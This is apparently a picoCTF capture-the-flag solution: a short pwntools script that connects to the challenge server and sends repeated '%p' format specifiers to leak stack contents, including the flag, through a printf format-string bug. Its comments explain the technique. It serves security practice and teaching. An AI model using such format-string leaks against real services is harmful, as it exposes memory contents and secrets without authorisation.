import socket
from pwn import *

r = remote("mimas.picoctf.net", 65075)
r.recvuntil(b"Give me your order and I'll read it back to you:\n")

"""
The idea is to send enough data so that the format specifiers incite printf() to read enough data off the stack (where arguments would be if they existed) to get to the flag.

So we need to figure out how many bytes deep the flag is on the stack, then send format specifieres reading that much data in (e.g. %x reads 4 bytes at a time)
"""

# The buffer we're exploiting is 1024B long, but printf() is blindly printing whatever is stored in it,
# meaning we can use whatever format specifiers we want.
r.send("%p"*14 + "\n")
#r.send("%lx,"*14 + "\n")

result = r.recvuntil(b"Bye!\n")

result = result.rstrip(b"Bye!\n")
print(result.decode())
